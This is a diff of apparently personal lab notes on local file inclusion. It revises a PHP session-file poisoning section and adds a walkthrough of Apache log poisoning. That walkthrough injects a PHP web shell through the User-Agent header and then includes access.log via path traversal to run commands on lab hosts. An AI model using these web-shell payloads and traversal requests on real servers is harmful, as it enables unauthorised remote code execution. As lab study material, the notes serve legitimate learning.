@@ -581,11 +581,11 @@ http://94.237.48.12:41125/index.php?language=../../../var/lib/php/sessions/sess_
 
 ![Filtered output](images/log-poisoning.png)
 
-The value is reflected in the log file. PHP automatically stores request parameters and session data inside the session file, which makes it possible to inject executable PHP code.
+The value is reflected in the session file. PHP automatically stores request parameters and session data inside the session file, which makes it possible to inject executable PHP code.
 
 **Step 3:**
 
-Poison the log file by writing a URL encoded web shell to it:
+Poison the session file by writing a URL encoded web shell to it:
 
 ```bash
 # Web shell
@@ -601,7 +601,7 @@ http://94.237.48.12:41125/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22c
 
 **Step 4:**
 
-Include the log file in an LFI and execute commands through the `cmd` parameter:
+Include the session file in an LFI and execute commands through the `cmd` parameter:
 
 ```bash
 http://94.237.48.12:41125/index.php?language=../../../var/lib/php/sessions/sess_4uln7ifh9us3lmej4u5lsd88ic&cmd=id
@@ -610,3 +610,80 @@ http://94.237.48.12:41125/index.php?language=../../../var/lib/php/sessions/sess_
 ![Filtered output](images/log-poisoning2.png)
 
 Keep in mind that the session file is rewritten on subsequent requests, overwriting the injected payload. To execute another command the log file has to be re-poisoned with the web shell.
+
+### Server Log Poisoning
+
+Servers such as Apache and Nginx maintain various log files. Examples include:
+
+- access.log
+- error.log
+
+`access.log` stores all requests made to the server, including each request's **User-Agent** header. A request's **User-Agent** header can be modified and utilized to perform log poisoning.
+
+Two main things are required for this attack to work:
+
+- An LFI vulnerability
+- Read access over logs
+
+By default, Apache logs are readable by `root` and users in the `adm` group. Nginx logs are often readable by lower-privileged service users, making log poisoning more common in misconfigured environments.
+
+Logs are located in the following directories:
+
+Linux:
+
+- /var/log/apache2/ 	
+- /var/log/nginx/ 	
+
+Windows:
+
+- C:\xampp\apache\logs\
+- C:\nginx\log\
+
+**Step 1:** 
+
+Attempt to include log file through LFI:
+
+```bash
+http://94.237.54.192:55031/index.php?language=../../../var/log/apache2/access.log
+```
+
+![Filtered output](images/log-poisoning3.png)
+
+We can indeed read the `access.log` file.
+
+**Step 2:**
+
+Intercept the request in BurpSuite. Modify the **User-Agent** header to see if it is reflected in the log file.
+
+```bash
+User-Agent: Apache Log Poisoning
+```
+
+![Filtered output](images/user-agent-header.png)
+
+It is indeed reflected in the log file:
+
+![Filtered output](images/user-agent-header2.png)
+
+**Step 3:**
+
+Inject a web shell into the **User-Agent** header:
+
+```bash
+User-Agent: <?php system($_GET["cmd"]);?>
+```
+
+![Filtered output](images/user-agent-header3.png)
+
+**Step 4:**
+
+Utilize the LFI vulnerability to execute commands through the `cmd` parameter:
+
+```bash
+index.php?language=../../../var/log/apache2/access.log&cmd=id
+```
+
+Because PHP executes any included file regardless of its original purpose, injected PHP code inside log files is interpreted and executed.
+
+![Filtered output](images/user-agent-header4.png)
+
